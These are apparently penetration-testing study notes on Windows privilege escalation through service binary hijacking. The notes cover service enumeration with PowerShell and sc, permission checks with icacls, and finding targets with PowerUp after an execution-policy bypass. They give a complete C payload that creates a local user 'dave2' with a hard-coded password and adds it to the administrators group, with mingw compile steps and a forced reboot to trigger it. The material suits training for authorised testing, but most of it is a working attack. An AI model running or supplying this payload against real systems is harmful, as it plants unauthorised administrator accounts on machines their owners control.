Get a list of all installed Windows services:
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Any program that is not listed in the C:\Windows\System32 directory (e.g. C:\xampp\\) can be assumed to be user installed

Use icacls to list permissions on a file:
```
icacls "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
```

Use sc to determine who the service starts as:
```
sc.exe \\localhost qc audittracker | findstr SERVICE_START_NAME
```

|Mask|Permissions|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|

***Exploit Vulnerability***
- On kali: Create C program adduser.c
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
- compile:
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

On victim: Check Startmode of a service:
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Check to see if we have Shutdown priv. NOTE: The _Disabled_ state only indicates if the privilege is currently enabled for the running process, if the priv is listed at all the user has the priv:
```
whoami /priv
```

Issue a restart command:
```
shutdown /r /t 0
```

Check to see if the user was added to the admins group:
```
Get-LocalGroupMember administrators
```

Use Powerup to find vulnerable services:
```
powershell -ep bypass
```
```
. .\PowerUp.ps1
```
```
Get-ModifiableServiceFile
```

NOTE:
- sc.exe might have to be used to stop/start services in order to make it run as nt/authority
